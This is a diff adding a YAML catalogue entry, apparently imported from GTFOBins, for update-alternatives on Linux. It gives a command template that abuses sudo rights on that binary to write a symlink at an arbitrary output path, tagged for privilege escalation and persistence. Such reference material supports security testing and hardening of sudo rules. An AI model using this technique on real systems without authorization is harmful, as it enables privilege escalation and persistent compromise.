@@ -1,0 +1,27 @@
+id: gtfobins/update-alternatives/file-write/sudo
+type: binary
+platform: linux
+name: update-alternatives
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo DATA >/path/to/temp-file
+
+    update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0'
+  comment: Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.
+references:
+- https://gtfobins.github.io/gtfobins/update-alternatives/
+tags:
+- linux
+- unix
+- gtfobins
